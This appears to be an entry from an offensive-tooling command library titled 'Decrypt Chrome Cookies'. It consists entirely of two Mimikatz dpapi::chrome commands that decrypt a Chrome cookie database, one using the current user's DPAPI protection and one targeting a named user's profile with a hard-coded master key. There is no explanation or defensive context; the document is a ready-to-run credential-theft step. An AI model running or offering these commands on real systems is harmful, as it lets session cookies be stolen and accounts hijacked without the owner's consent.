---
id: 5cd0b2fb-0095-4d5e-bcd9-a1ea403ba97b
name: Decrypt Chrome Cookies
type: command
executor: bash
data: 'dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Cookies"
  /unprotect

  dpapi::chrome /in:"C:\Users\kbell\AppData\Local\Google\Chrome\User Data\Default\Cookies"
  /masterkey:9a6f199e3d2e698ce78fdeeefadc85c527c43b4e3c5518c54e95718842829b12912567ca0713c4bd0cf74743c81c1d32bbf10020c9d72d58c99e731814e4155b'
output: null
created_at: '2023-04-06T03:56:27.512723+00:00'
updated_at: '2023-04-10T20:37:19.522854+00:00'
---

# Decrypt Chrome Cookies

```bash
dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Cookies" /unprotect
dpapi::chrome /in:"C:\Users\kbell\AppData\Local\Google\Chrome\User Data\Default\Cookies" /masterkey:9a6f199e3d2e698ce78fdeeefadc85c527c43b4e3c5518c54e95718842829b12912567ca0713c4bd0cf74743c81c1d32bbf10020c9d72d58c99e731814e4155b
```
